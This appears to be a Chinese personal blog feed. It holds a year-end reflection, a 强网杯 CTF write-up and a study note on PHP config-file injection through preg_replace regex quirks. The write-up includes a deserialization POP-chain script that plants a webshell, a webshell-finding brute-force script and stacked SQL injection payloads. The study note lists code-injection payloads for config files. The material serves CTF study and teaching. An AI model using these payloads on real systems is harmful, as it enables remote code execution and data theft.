<h3 id="有哪些东西我本可以在今年做的更好"><a href="#有哪些东西我本可以在今年做的更好" class="headerlink" title="有哪些东西我本可以在今年做的更好"></a>有哪些东西我本可以在今年做的更好</h3><h4 id="比赛-学习："><a href="#比赛-学习：" class="headerlink" title="比赛/学习："></a>比赛/学习：</h4><ul>
<li>提高做事情的专注度，在2019年我做事情的专注度可以说是很差了</li>
<li>增加上课时间的利用率，2019几乎是从未听过一节课，上课的时间都放在了刷知乎了，所以2020我觉得充分利用上课的时间可以给我带来很大的益处。</li>
<li>打一些高质量的比赛，少打垃圾比赛</li>
</ul>
<h4 id="生活方面：-2"><a href="#生活方面：-2" class="headerlink" title="生活方面："></a>生活方面：</h4><p>感觉在2019年我的整个生活态度是比较丧的吧，我应该是积极调整心态，去冷观生活的，正如她所说：生活是滚烫的，而人的生活应该是热烈的。</p>
<h4 id="健康方面：-2"><a href="#健康方面：-2" class="headerlink" title="健康方面："></a>健康方面：</h4><p>每天一定要抽出一些时间来锻炼身体的，跑步还是对一整天的劳累有很大的缓解作用的。</p>
<h4 id="书籍阅读方面：-2"><a href="#书籍阅读方面：-2" class="headerlink" title="书籍阅读方面："></a>书籍阅读方面：</h4><p>可能是最后两个月的个人感情导致的问题吧，读书也不太专心，导致后面两个月的读书进度很慢，可以说是后两个月几乎什么都没做了，复习的时候也是状态很差的，我本可以在这两个月做的更好，不过人生的每段经历都有其各自的对应意义吧，都可以让人更快的成长起来。</p>
<h3 id="今年踩过的坑-有什么教训"><a href="#今年踩过的坑-有什么教训" class="headerlink" title="今年踩过的坑 有什么教训"></a>今年踩过的坑 有什么教训</h3><p>今年踩的坑主要是生活方面，更具体来说应该是感情方面，对我来说这个坑不是今年的坑，已经很多年了，只不过今年又踩了一次罢了。</p>
<p>“你所拥有的只是单纯真挚的喜欢”</p>
<p>每一段经历似乎都像是人生路途的一段风景，而究竟你是被我抹去那段风景，还是我是被你抹去的那段风景似乎也没那么重要，毕竟都已不在了…</p>
<p><a href="https://imgchr.com/i/lTk9qx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/12/lTk9qx.md.png" alt="lTk9qx.md.png"></a></p>
<p>更多的困扰应该是由执念无法放下而产生的</p>
<p>说到底之所以无法放下还是因为个人拥有的太少了，而戏确太多了，回顾一下过去的几段经历，确实，我活的像个戏精一样，其实在对方那里”戏精”的地位根本不重要，一切都是自我幻想而已，我给自己加了很多戏码，同时也沉迷于我自己给自己安排的这些戏里，无法自拔，就像是我给自己进行深度催眠了好久一样。</p>
<p>看过一段话蛮有道理</p>
<blockquote>
<p>“其实一切都是你的幻想，你在别人那里根本不重要，一切的情深状态，都是你自己安排给自己的戏而已，你在自己幻想的戏份中，演得津津有味，殊不知这些时间，对方已经成长多少，做了多少对他自己有益的事，只有你在这里当个戏精”</p>
</blockquote>
<p>想想之前的自己何尝不是陷入这样的状态，为了这些不值得的人或事物，浪费自己宝贵的成长时间。</p>
<h3 id="明年想要学习与精进的东西"><a href="#明年想要学习与精进的东西" class="headerlink" title="明年想要学习与精进的东西"></a>明年想要学习与精进的东西</h3><h4 id="精进"><a href="#精进" class="headerlink" title="精进"></a>精进</h4><ul>
<li>加厚技术栈，不断学习思考，精进面对事物理性思考的能力，最大化限制感性的地方</li>
<li>多写代码，多审计代码</li>
</ul>
<h4 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h4><ul>
<li>提高实战渗透能力</li>
<li>学习摄影以及各类剪辑软件的使用</li>
<li>FPV穿越机的入门</li>
</ul>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>愿2020年理性且热烈！加油！</p>
]]></content>
      <tags>
        <tag>生活随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯部分wp</title>
    <url>/2019/06/04/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>强网杯与物理实验撞了还是很难受的..没发现upload源码泄露更难受，下面是对其他题目的一些复盘</p>
<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>主要后台逻辑文件共有<code>Register.php,login.php,Profile.php.Index.php</code>这四个文件</p>
<p>先理清一下文件的代码逻辑</p>
<p>register的函数逻辑</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbaxb9o7j31350hwtaz.jpg" alt="img"></p>
<p>首先调用__construct进行new Index(),从Index中调用login_check进行登陆检测，login_check函数代码如下：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbdsms7hj30u40ajdge.jpg" alt="img"></p>
<p>可以看到函数逻辑为将目前<strong>User处的反序列化数据与数据库中的进行对比，如果不同则直接返回0</strong>，这里就是我们要利用的一个点——–<strong>unserialize</strong></p>
<p>接着去找一下所有文件中危险魔术方法操作</p>
<p><strong>register处的__construct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbkopahoj30rm0fbt9p.jpg" alt="img"></p>
<p><strong>register处destruct</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbgnza1jj30gt075mx5.jpg" alt="img"></p>
<p><strong>Profile中的<strong>call与</strong>get方法</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbin6dtvj30ju0cyweq.jpg" alt="img"></p>
<p><strong>这四个魔术方法足以形成一个pop链，去调用任意函数方法</strong>，解析如下:</p>
<p><strong>当<strong>destruct中的$this-&gt;checker指向的index方法如果在$this-&gt;checker这个类不存在的话，那么就会触发</strong>call方法，在<strong>call方法中逻辑:调用$this-&gt;{$name}，但是如果此类中仍然不存在$this-&gt;${name}变量的话,那么就会再一次触发</strong>get魔术方法，去返回expect数组中对应调用此$this-&gt;name的值，然后__call再次去调用expect数组中对应的值，所以只要我们构造好expect数组中index对应值，就可以实现执行任意方法的操作，将值写成方法的名字，便可调用任意方法。</strong></p>
<p>这里还要说明一点:为什么这个反序列化数据看起来的作用域是所有类的，看到所有类中是基本都有一个<strong>login_check</strong>函数的，所以反序列化的数据对应的作用域即是所有类，所以可以进行构造反序列化自由调用。</p>
<h4 id="既然可以执行任意方法函数了，下面来找一下危险函数方法"><a href="#既然可以执行任意方法函数了，下面来找一下危险函数方法" class="headerlink" title="既然可以执行任意方法函数了，下面来找一下危险函数方法"></a>既然可以执行任意方法函数了，下面来找一下危险函数方法</h4><p>在Profile类中存在<strong>upload-img危险函数</strong></p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kbwpsd9kj30wx0ke765.jpg" alt="img"></p>
<p>可以看到有一个<strong>危险操作copy函数，如果我们控制了filename与filename_tmp就可以成功生成自己的webshell了</strong></p>
<p>这里在upload_img函数中有几个点需要去绕过一下：</p>
<ul>
<li>login_check函数：在反序列化时通过this-&gt;checker实例化Index类进行login_check调用检查，这里比较好绕过，<strong>可以不用管$this-&gt;checker(因为反序列化不会去调用__construct方法，还可以将$this&gt;checker赋值为0或者false,都可以实现绕过。</strong></li>
<li>第二个if，反序列化的时候不上传文件即可绕过。</li>
<li>第三个，就是之前所说的文件头伪造绕过的</li>
<li>赋值<strong>$this-&gt;ext为1</strong>,进入copy函数生成图片马</li>
</ul>
<p>下面为逻辑图</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kd2tuaeyj30t60dsdh6.jpg" alt="img"></p>
<p>这样我们就可以很轻松的写出反序列化构造代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $registed&#x3D;0;</span><br><span class="line">    public $checker;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker&#x3D;new Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $except&#x3D;array(&#39;index&#39;&#x3D;&gt;&#39;upload_img&#39;);</span><br><span class="line">    public $filename_tmp&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;bc9c0f21801e3928b868149bfb65e408&#x2F;cd3d1cc6e477b590d1b89a6ee805808e.png&#39;;</span><br><span class="line">    public $filename&#x3D;&#39;..&#x2F;public&#x2F;upload&#x2F;lihuaiqiu.php&#39;;</span><br><span class="line">    public $ext&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$v&#x3D;new Register();</span><br><span class="line">echo base64_encode(serialize($v));</span><br></pre></td></tr></table></figure>

<p>将生成的base64编码放进cookie中，得到webshell</p>
<p><a href="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg" target="_blank" rel="noopener">https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3kdbu25hrj31590fnabf.jpg</a></p>
<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p>开始还以为是源码混淆Orz，其实是一个webshell检测。</p>
<p>下载下来先看一看各个文件的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_GET[<span class="string">'koCDtumdL'</span>] = <span class="string">' '</span>;</span><br><span class="line"><span class="keyword">echo</span> `&#123;$_GET[<span class="string">'koCDtumdL'</span>]&#125;`;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_GET[<span class="string">'I29lh7cQy'</span>] = <span class="string">' '</span>;</span><br><span class="line">$XnG = <span class="string">'HuyJp9'</span>;</span><br><span class="line">$VMu0e9 = <span class="string">'IcO5xu3U'</span>;</span><br><span class="line">$Hoe5A = <span class="string">'PJG62i'</span>;</span><br><span class="line">$ubz = <span class="keyword">new</span> stdClass();</span><br><span class="line">$ubz-&gt;aJ8 = <span class="string">'gGUGkqZC'</span>;</span><br><span class="line">$ubz-&gt;tv79bhFX = <span class="string">'Nqnz9sBp75'</span>;</span><br><span class="line">$ubz-&gt;qm5PiB = <span class="string">'N9D'</span>;</span><br><span class="line">$CEOXM1OK = <span class="string">'JxK'</span>;</span><br><span class="line">$je3_P4w = <span class="string">'xdWIprx5TX'</span>;</span><br><span class="line">$VMu0e9 = $_GET[<span class="string">'xUX5t3zfVyCTro'</span>] ?? <span class="string">' '</span>;</span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">"n0w_vOdIh5wEQhC"</span>))&#123;</span><br><span class="line">    n0w_vOdIh5wEQhC($Hoe5A);</span><br><span class="line">&#125;</span><br><span class="line">var_dump($je3_P4w);</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'I29lh7cQy'</span>] ?? <span class="string">' '</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到大部分文件中，虽然有一句话木马，但是都是一些障眼法，在一句话木马的上方，是有代码将传入的值置空的。</p>
<p>本地搭建进行代码爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">partern=re.compile(<span class="string">r'(_GET\[\')(.*)(\'\])'</span>)</span><br><span class="line">url=<span class="string">'http://127.0.0.1/src'</span></span><br><span class="line">command=<span class="string">"echo 'lihuaiqiu'"</span></span><br><span class="line">filename=os.listdir(<span class="string">"F:\\phpstudy\\WWW\\src"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    true_url=url+i</span><br><span class="line">    d=open(<span class="string">"F:\\phpstudy\\WWW\\src\\"</span>+i)</span><br><span class="line">    c=d.read()</span><br><span class="line">    params=partern.findall(c)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> params:</span><br><span class="line">        url2=true_url+<span class="string">'?'</span>+j[<span class="number">1</span>]+<span class="string">'='</span>+command</span><br><span class="line">        r=requests.get(url2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"lihuaiqiu"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Webshell"</span></span><br><span class="line">            <span class="keyword">print</span> url2</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>这道题成功触及了我的知识盲区….来学习一波</p>
<h4 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h4><p>先基本操作一下，看看表，数据库，当前表</p>
<p><code>1&#39;;show databases;</code></p>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1&#39;;show tables;</code></p>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>1&#39;;describe words;</code></p>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下过程省略…最后可以得到结果，我们处于<code>table words</code>中，而flag在<code>table 1919810931114514</code>中</p>
<p>也就是说我们需要在没有select的情况下进行跨表查询，下面就是学到师傅的姿势——<code>将flag表名改为当前表名words，再利用&#39;or &#39;1&#39;=&#39;1去获取flag表中所有内容。</code>但是这里需要注意的是words表比flag表多了一个id字段，所以我们要通过alert在flag表中添加一个id字段，最终payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;alert table &#39;1919810931114514&#39; add(id int NULL);rename table &#96;words&#96; to &#96;tmptable&#96;;rename table &#96;1919810931114514&#96;to words;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(38) &quot;flag&#123;3fy145hzdo5ryeho9za94r0qnbkvha0g&#125;&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h4><p>堆叠注入(预处理)</p>
<p>查询字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;use information_schema;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect column_name from columns wher&#39;,&#39;e table_name&#x3D;&quot;1919810931114514&quot;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>爆字段内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;use supersqli;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br></pre></td></tr></table></figure>

<p>大写PREPARE关键字绕过strstr，得到flag。</p>
<h3 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h3><p>挺沙雕的一道题….tp5框架的RCE，打就行了</p>
<h3 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h3><p>老套路了….公因数求q，然后得p,rsa一把梭</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1=</span><br><span class="line">n2=</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">q=gcd(n1,n2)</span><br><span class="line">p1=n1/q</span><br><span class="line">fn1=(q<span class="number">-1</span>)*(p1<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,fn1)</span><br><span class="line">m=pow(c,d,n1)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure>

<h3 id="强网先锋-打野"><a href="#强网先锋-打野" class="headerlink" title="强网先锋-打野"></a>强网先锋-打野</h3><p>zsteg真香(学到了)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3oyb990kxj30qm0di0y2.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>正则与经典写配置漏洞学习</title>
    <url>/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看到P牛的小密圈发了这篇文章 感觉很棒 所以来学习一下.</p>
<h3 id="前置知识铺垫"><a href="#前置知识铺垫" class="headerlink" title="前置知识铺垫"></a>前置知识铺垫</h3><h4 id="single-line和multi-line"><a href="#single-line和multi-line" class="headerlink" title="single-line和multi-line"></a>single-line和multi-line</h4><p>single-line与multi-line分别对应了/s和/m修饰符。</p>
<h5 id="multi-line"><a href="#multi-line" class="headerlink" title="multi-line"></a>multi-line</h5><p>multi-line表示按行来进行正则匹配：将待匹配的文本利用换行符分割，并对每一部分进行正则匹配，将每部分的结果用or进行运算，得出最终的结果。</p>
<p>举一个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/m'</span>, <span class="string">"abbz\n123"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回1</span></span><br></pre></td></tr></table></figure>

<h5 id="single-line"><a href="#single-line" class="headerlink" title="single-line"></a>single-line</h5><p>将待匹配文本视作单行，并且换行符不再作为换行的标志，. 可匹配换行符</p>
<h4 id="默认情况的正则-不加修饰符"><a href="#默认情况的正则-不加修饰符" class="headerlink" title="默认情况的正则(不加修饰符)"></a>默认情况的正则(不加修饰符)</h4><p>对于如下正则：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明默认情况下非多行匹配</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a.+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明无法匹配换行符</span><br></pre></td></tr></table></figure>

<p>所以在默认情况下代表着：single-line且.不会匹配换行符</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>引用一下p牛的总结</p>
<ul>
<li>不加s或m修饰符 -&gt; single line，但 . 不能匹配换行符</li>
<li>单独加s修饰符 -&gt; single line，且 . 匹配包括换行符在内的所有字符</li>
<li>单独加m修饰符 -&gt; multi line</li>
<li>同时加m和s两个修饰符 -&gt; multi line，且 . 匹配包括换行符在内的所有字符</li>
</ul>
<h3 id="配置漏洞与其变形"><a href="#配置漏洞与其变形" class="headerlink" title="配置漏洞与其变形"></a>配置漏洞与其变形</h3><h4 id="正则贪婪模式且无-s修饰符"><a href="#正则贪婪模式且无-s修饰符" class="headerlink" title="正则贪婪模式且无/s修饰符"></a>正则贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>利用.*不会匹配换行的特性，利用换行绕过</p>
<p>第一次：api=a’;%0aphpinfo();//</p>
<p>第二次：api=aaa</p>
<h4 id="正则贪婪模式且有-s修饰符"><a href="#正则贪婪模式且有-s修饰符" class="headerlink" title="正则贪婪模式且有/s修饰符"></a>正则贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>由于/s修饰符 所以无法利用换行绕过，不过可以用$0或者\0来引入单引号进行闭合，$0在preg_replace函数中代表着完整的匹配模式或者匹配文本</p>
<p>第一次</p>
<p>api=;phpinfo();//</p>
<p>对应：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$API = <span class="string">';phpinfo();//'</span>;</span><br></pre></td></tr></table></figure>

<p>第二次</p>
<p>api=$0</p>
<p>对应</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$API = <span class="string">'$API = '</span>;phpinfo();<span class="comment">//';';</span></span><br></pre></td></tr></table></figure>

<p>成功在配置文件中写入任意内容</p>
<h4 id="正则非贪婪模式且无-s修饰符"><a href="#正则非贪婪模式且无-s修饰符" class="headerlink" title="正则非贪婪模式且无/s修饰符"></a>正则非贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>和之前唯一不同的是现在是非贪婪的匹配模式，也就意味着匹配到第一个单引号之后就不会接着往下继续匹配了</p>
<p>所以我们换行和不换行都可以绕过了</p>
<p>Payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="正则非贪婪模式且有-s修饰符"><a href="#正则非贪婪模式且有-s修饰符" class="headerlink" title="正则非贪婪模式且有/s修饰符"></a>正则非贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>虽然加了/s修饰符，但是因为为非贪婪模式，上面的payload同样适用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的贪婪且-s修饰"><a href="#define情况下的贪婪且-s修饰" class="headerlink" title="define情况下的贪婪且/s修饰"></a>define情况下的贪婪且/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>和第一种一样，只是换了下变量的定义方式，换行绕过即可</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一次</span><br><span class="line">api&#x3D;a&#39;);%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">第二次</span><br><span class="line">api&#x3D;a</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的贪婪且无-s修饰"><a href="#define情况下的贪婪且无-s修饰" class="headerlink" title="define情况下的贪婪且无/s修饰"></a>define情况下的贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>因为有不可闭合的单引号，所以这种情况下无法使用$0</p>
<p>不过可以使用这个trick: <code>preg_replace</code> 在替换的时候会吃掉转义符 来进行引号闭合</p>
<p>preg_match可将<code>\\</code>转化为<code>\</code> <strong>这也就意味着…其实用这种方式可以逃逸掉这篇文章里所有的单引号</strong></p>
<p>Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">api&#x3D;a\%27);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>得到的配置文件内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;API&#39;, &#39;a\\&#39;);phpinfo();&#x2F;&#x2F;&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="define情况下的非贪婪且有-s修饰"><a href="#define情况下的非贪婪且有-s修饰" class="headerlink" title="define情况下的非贪婪且有/s修饰"></a>define情况下的非贪婪且有/s修饰</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure>

<p>Payload:</p>
